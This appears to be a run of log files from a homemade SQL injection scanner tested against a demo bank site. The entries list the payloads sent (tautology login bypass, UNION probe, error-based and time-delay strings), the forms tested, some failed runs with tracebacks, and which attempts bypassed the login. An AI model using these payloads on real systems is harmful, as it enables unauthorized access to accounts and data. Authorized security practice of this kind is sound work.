+Log started on 2024-11-30 12:53:30.731470
+[SUCCESS] [2024-11-30 12:53:13] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 12:53:13] Testing Basic Authentication Bypass: Simple login bypass attempt
+[WARNING] [2024-11-30 12:53:13] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Basic Authentication Bypass
+  Value: ' OR '1'='1
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271
+  Reason: URL changed and Content length changed
+[INFO] [2024-11-30 12:53:13] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-30 12:53:13] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+  Reason: URL changed and Content length changed
+[INFO] [2024-11-30 12:53:13] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-30 12:53:14] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+  Reason: URL changed and Content length changed
+[INFO] [2024-11-30 12:53:14] Testing Time Based: Tests for blind injection via time delays
+[WARNING] [2024-11-30 12:53:14] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Time Based
+  Value: '; WAITFOR DELAY '0:0:5'--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--
+  Reason: URL changed and Content length changed
+[INFO] [2024-11-30 12:53:14] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-30 12:53:14] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Boolean Based
+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+  Reason: URL changed and Content length changed
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 12:53:24] Failed to capture baseline for login
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-30 12:53:24] Found 5 potential SQL injection vulnerabilities:
+================================================================================
+
+Form: frmSearch
+Found 5 vulnerabilities:
+----------------------------------------
+1. Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Reason: URL changed and Content length changed
+
+2. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: URL changed and Content length changed
+
+3. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: URL changed and Content length changed
+
+4. Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Reason: URL changed and Content length changed
+
+5. Boolean Based
+   Value: ' OR 1=1--
+   Reason: URL changed and Content length changed
+
+
+Log started on 2024-11-30 13:12:14.914680
+[SUCCESS] [2024-11-30 13:11:57] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 13:11:57] Testing Basic Authentication Bypass: Simple login bypass attempt
+[INFO] [2024-11-30 13:11:57] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-30 13:11:58] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+  Reason: UNION-based injection detected
+[INFO] [2024-11-30 13:11:58] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-30 13:11:58] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+  Reason: Response content differs from baseline
+[INFO] [2024-11-30 13:11:58] Testing Time Based: Tests for blind injection via time delays
+[INFO] [2024-11-30 13:11:58] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-30 13:11:58] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Boolean Based
+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+  Reason: Boolean-based injection successful
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:12:08] Failed to capture baseline for login
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-30 13:12:08] Found 3 potential SQL injection vulnerabilities:
+================================================================================
+
+Form: frmSearch
+Found 3 vulnerabilities:
+----------------------------------------
+1. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: UNION-based injection detected
+
+2. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: Response content differs from baseline
+
+3. Boolean Based
+   Value: ' OR 1=1--
+   Reason: Boolean-based injection successful
+
+
+Log started on 2024-11-30 13:29:49.696610
+[SUCCESS] [2024-11-30 13:29:43] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:29:43] Failed to capture baseline for frmSearch
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:29:43] Fatal error: 'builtin_function_or_method' object has no attribute 'sleep'
+[ERROR] [2024-11-30 13:29:43] Traceback (most recent call last):
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 399, in main
+    findings = scanner.test_all_forms()
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 300, in test_all_forms
+    findings = self.test_form(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 108, in test_form
+    baseline = self.driver.capture_form_baseline(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\Utils.py", line 856, in capture_form_baseline
+    return self.test_form_submission(form_name, baseline_value)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\Utils.py", line 700, in test_form_submission
+    time.sleep(2)
+    ^^^^^^^^^^
+AttributeError: 'builtin_function_or_method' object has no attribute 'sleep'
+
+
+Log started on 2024-11-30 13:32:05.502726
+[SUCCESS] [2024-11-30 13:31:58] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:31:59] Failed to capture baseline for frmSearch
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:31:59] Fatal error: module 'datetime' has no attribute 'sleep'
+[ERROR] [2024-11-30 13:31:59] Traceback (most recent call last):
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 399, in main
+    findings = scanner.test_all_forms()
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 300, in test_all_forms
+    findings = self.test_form(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 108, in test_form
+    baseline = self.driver.capture_form_baseline(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\Utils.py", line 856, in capture_form_baseline
+    return self.test_form_submission(form_name, baseline_value)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\Utils.py", line 700, in test_form_submission
+    datetime.sleep(2)
+    ^^^^^^^^^^^^^^
+AttributeError: module 'datetime' has no attribute 'sleep'
+
+
+Log started on 2024-11-30 13:32:50.055471
+[SUCCESS] [2024-11-30 13:32:43] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:32:43] Failed to capture baseline for frmSearch
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:32:43] Fatal error: 'builtin_function_or_method' object has no attribute 'sleep'
+[ERROR] [2024-11-30 13:32:43] Traceback (most recent call last):
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 399, in main
+    findings = scanner.test_all_forms()
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 300, in test_all_forms
+    findings = self.test_form(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 108, in test_form
+    baseline = self.driver.capture_form_baseline(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\Utils.py", line 856, in capture_form_baseline
+    return self.test_form_submission(form_name, baseline_value)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\Utils.py", line 700, in test_form_submission
+    time.sleep(2)
+    ^^^^^^^^^^
+AttributeError: 'builtin_function_or_method' object has no attribute 'sleep'
+
+
+Log started on 2024-11-30 13:35:12.506449
+[SUCCESS] [2024-11-30 13:35:05] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:35:06] Failed to capture baseline for frmSearch
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 13:35:06] Fatal error: 'builtin_function_or_method' object has no attribute 'sleep'
+[ERROR] [2024-11-30 13:35:06] Traceback (most recent call last):
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 399, in main
+    findings = scanner.test_all_forms()
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 300, in test_all_forms
+    findings = self.test_form(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 108, in test_form
+    baseline = self.driver.capture_form_baseline(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\Utils.py", line 856, in capture_form_baseline
+    return self.test_form_submission(form_name, baseline_value)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\Utils.py", line 700, in test_form_submission
+    time.sleep(2)
+    ^^^^^^^^^^
+AttributeError: 'builtin_function_or_method' object has no attribute 'sleep'
+
+
+Log started on 2024-11-30 13:37:01.504458
+[SUCCESS] [2024-11-30 13:36:13] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 13:36:15] Testing Basic Authentication Bypass: Simple login bypass attempt
+[INFO] [2024-11-30 13:36:19] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-30 13:36:24] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+  Reason: UNION-based injection detected
+[INFO] [2024-11-30 13:36:24] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-30 13:36:28] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+  Reason: Response content differs from baseline
+[INFO] [2024-11-30 13:36:28] Testing Time Based: Tests for blind injection via time delays
+[INFO] [2024-11-30 13:36:32] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-30 13:36:36] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Boolean Based
+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+  Reason: Boolean-based injection successful
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 13:36:41] Testing Basic Authentication Bypass: Simple login bypass attempt
+[WARNING] [2024-11-30 13:36:43] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Basic Authentication Bypass
+  Value: ' OR '1'='1
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Response content differs from baseline
+[INFO] [2024-11-30 13:36:43] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-30 13:36:48] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error
+[INFO] [2024-11-30 13:36:48] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-30 13:36:50] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error
+[INFO] [2024-11-30 13:36:50] Testing Time Based: Tests for blind injection via time delays
+[WARNING] [2024-11-30 13:36:53] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Time Based
+  Value: '; WAITFOR DELAY '0:0:5'--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error
+[INFO] [2024-11-30 13:36:53] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-30 13:36:55] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Boolean Based
+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Response content differs from baseline
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-30 13:36:55] Found 8 potential SQL injection vulnerabilities:
+================================================================================
+
+Form: frmSearch
+Found 3 vulnerabilities:
+----------------------------------------
+1. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: UNION-based injection detected
+
+2. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: Response content differs from baseline
+
+3. Boolean Based
+   Value: ' OR 1=1--
+   Reason: Boolean-based injection successful
+
+
+Form: login
+Found 5 vulnerabilities:
+----------------------------------------
+1. Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Reason: Response content differs from baseline
+
+2. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: SQL syntax error
+
+3. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: SQL syntax error
+
+4. Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Reason: SQL syntax error
+
+5. Boolean Based
+   Value: ' OR 1=1--
+   Reason: Response content differs from baseline
+
+
+Log started on 2024-11-30 13:58:09.656696
+[SUCCESS] [2024-11-30 13:57:21] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 13:57:23] Testing Basic Authentication Bypass: Simple login bypass attempt
+[INFO] [2024-11-30 13:57:28] Testing Union Select Probe: Tests for UNION injection possibility
+[INFO] [2024-11-30 13:57:32] Testing Error Based: Attempts to trigger SQL error messages
+[INFO] [2024-11-30 13:57:36] Testing Time Based: Tests for blind injection via time delays
+[INFO] [2024-11-30 13:57:40] Testing Boolean Based: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 13:57:49] Testing Basic Authentication Bypass: Simple login bypass attempt
+[WARNING] [2024-11-30 13:57:51] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Basic Authentication Bypass
+  Value: ' OR '1'='1
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Response content differs from baseline
+[INFO] [2024-11-30 13:57:51] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-30 13:57:56] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: Response content differs from baseline
+[INFO] [2024-11-30 13:57:56] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-30 13:57:58] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: Response content differs from baseline
+[INFO] [2024-11-30 13:57:58] Testing Time Based: Tests for blind injection via time delays
+[WARNING] [2024-11-30 13:58:01] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Time Based
+  Value: '; WAITFOR DELAY '0:0:5'--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: Response content differs from baseline
+[INFO] [2024-11-30 13:58:01] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-30 13:58:03] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Boolean Based
+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Response content differs from baseline
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-30 13:58:03] Found 5 potential SQL injection vulnerabilities:
+================================================================================
+
+Form: login
+Found 5 vulnerabilities:
+----------------------------------------
+1. Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Reason: Response content differs from baseline
+
+2. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: Response content differs from baseline
+
+3. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: Response content differs from baseline
+
+4. Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Reason: Response content differs from baseline
+
+5. Boolean Based
+   Value: ' OR 1=1--
+   Reason: Response content differs from baseline
+
+
+Log started on 2024-11-30 14:02:22.437633
+[SUCCESS] [2024-11-30 14:01:34] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 14:01:36] Testing Basic Authentication Bypass: Simple login bypass attempt
+[INFO] [2024-11-30 14:01:40] Testing Union Select Probe: Tests for UNION injection possibility
+[INFO] [2024-11-30 14:01:45] Testing Error Based: Attempts to trigger SQL error messages
+[INFO] [2024-11-30 14:01:49] Testing Time Based: Tests for blind injection via time delays
+[INFO] [2024-11-30 14:01:53] Testing Boolean Based: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 14:02:02] Testing Basic Authentication Bypass: Simple login bypass attempt
+[WARNING] [2024-11-30 14:02:04] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Basic Authentication Bypass
+  Value: ' OR '1'='1
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Unexpected successful authentication
+[INFO] [2024-11-30 14:02:04] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-30 14:02:09] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:02:09] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-30 14:02:11] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:02:11] Testing Time Based: Tests for blind injection via time delays
+[WARNING] [2024-11-30 14:02:13] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Time Based
+  Value: '; WAITFOR DELAY '0:0:5'--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:02:13] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-30 14:02:16] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Boolean Based
+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Unexpected successful authentication
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-30 14:02:16] Found 5 potential SQL injection vulnerabilities:
+================================================================================
+
+Form: login
+Found 5 vulnerabilities:
+----------------------------------------
+1. Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Reason: Unexpected successful authentication
+
+2. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: SQL syntax error detected
+
+3. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: SQL syntax error detected
+
+4. Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Reason: SQL syntax error detected
+
+5. Boolean Based
+   Value: ' OR 1=1--
+   Reason: Unexpected successful authentication
+
+
+Log started on 2024-11-30 14:04:04.823803
+[SUCCESS] [2024-11-30 14:03:16] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 14:03:19] Testing Basic Authentication Bypass: Simple login bypass attempt
+[INFO] [2024-11-30 14:03:23] Testing Union Select Probe: Tests for UNION injection possibility
+[INFO] [2024-11-30 14:03:27] Testing Error Based: Attempts to trigger SQL error messages
+[INFO] [2024-11-30 14:03:31] Testing Time Based: Tests for blind injection via time delays
+[INFO] [2024-11-30 14:03:36] Testing Boolean Based: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 14:03:44] Testing Basic Authentication Bypass: Simple login bypass attempt
+[WARNING] [2024-11-30 14:03:47] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Basic Authentication Bypass
+  Value: ' OR '1'='1
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Unexpected successful authentication
+[INFO] [2024-11-30 14:03:47] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-30 14:03:51] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:03:51] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-30 14:03:54] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:03:54] Testing Time Based: Tests for blind injection via time delays
+[WARNING] [2024-11-30 14:03:56] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Time Based
+  Value: '; WAITFOR DELAY '0:0:5'--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:03:56] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-30 14:03:58] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Boolean Based
+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Unexpected successful authentication
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-30 14:03:58] Found 5 potential SQL injection vulnerabilities:
+================================================================================
+
+Form: login
+Found 5 vulnerabilities:
+----------------------------------------
+1. Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Reason: Unexpected successful authentication
+
+2. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: SQL syntax error detected
+
+3. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: SQL syntax error detected
+
+4. Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Reason: SQL syntax error detected
+
+5. Boolean Based
+   Value: ' OR 1=1--
+   Reason: Unexpected successful authentication
+
+
+Log started on 2024-11-30 14:06:49.759592
+[SUCCESS] [2024-11-30 14:06:01] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 14:06:03] Testing Basic Authentication Bypass: Simple login bypass attempt
+[INFO] [2024-11-30 14:06:08] Testing Union Select Probe: Tests for UNION injection possibility
+[INFO] [2024-11-30 14:06:12] Testing Error Based: Attempts to trigger SQL error messages
+[INFO] [2024-11-30 14:06:16] Testing Time Based: Tests for blind injection via time delays
+[INFO] [2024-11-30 14:06:20] Testing Boolean Based: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 14:06:29] Testing Basic Authentication Bypass: Simple login bypass attempt
+[WARNING] [2024-11-30 14:06:31] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Basic Authentication Bypass
+  Value: ' OR '1'='1
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/bank/main.jsp
+  Reason: Unexpected successful authentication
+[INFO] [2024-11-30 14:06:31] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-30 14:06:36] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:06:36] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-30 14:06:38] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:06:38] Testing Time Based: Tests for blind injection via time delays
+[WARNING] [2024-11-30 14:06:41] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Time Based
+  Value: '; WAITFOR DELAY '0:0:5'--
+  URL Change: https://demo.testfire.net/login.jsp -> https://demo.testfire.net/login.jsp
+  Reason: SQL syntax error detected
+[INFO] [2024-11-30 14:06:41] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-30 14:06:43] 
+Potential SQL Injection Found:
+  Form: login
+  Payload: Boolean Based
